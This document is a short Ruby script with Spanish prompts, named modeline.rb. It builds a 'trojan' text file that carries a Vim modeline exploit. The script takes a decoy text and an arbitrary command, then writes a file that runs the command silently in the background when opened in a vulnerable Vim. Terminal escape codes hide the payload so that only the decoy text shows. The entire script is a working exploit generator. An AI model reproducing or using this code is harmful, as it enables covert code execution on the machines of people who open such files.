##########################################################
# Nombre: modeline.rb
# Version: 0.1
# Autor: Victor J. Mejia Lara
# Licencia: GPL v3
#

#!/usr/bin/ruby -w

puts "Ingrese el nombre de archivo de texto"
STDOUT.flush
file = gets.chomp
if file.size == 0
	abort("No se a ingresado el nombre del archivo.")
end

puts "Texto a almacenar en el archivo #{ file }"
STDOUT.flush
text = gets.chomp
if text.size == 0
	abort("Se requiere el texto a ingresar en el archivo trojano")
end

puts "Ingrese el comando junto con sus parametros a insertar en el archivo #{ file }"
STDOUT.flush
cmd = gets.chomp
if cmd.size == 0
	abort("Se requiere al menos un comando a ejecutarse.")
end

code = "\x1b[?71\x1bS#{ text }\x1b:silent! w | call system(\'nohup #{ cmd } & \') | redraw! | file | silent! \# \" vim: set fen fdm=expr fde=assert_fails('set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x27[K#{ text } \" \x16\x1b[D \n"

File.open( "#{ file }", 'w') do |f|
	f.puts "#{ code }"
end
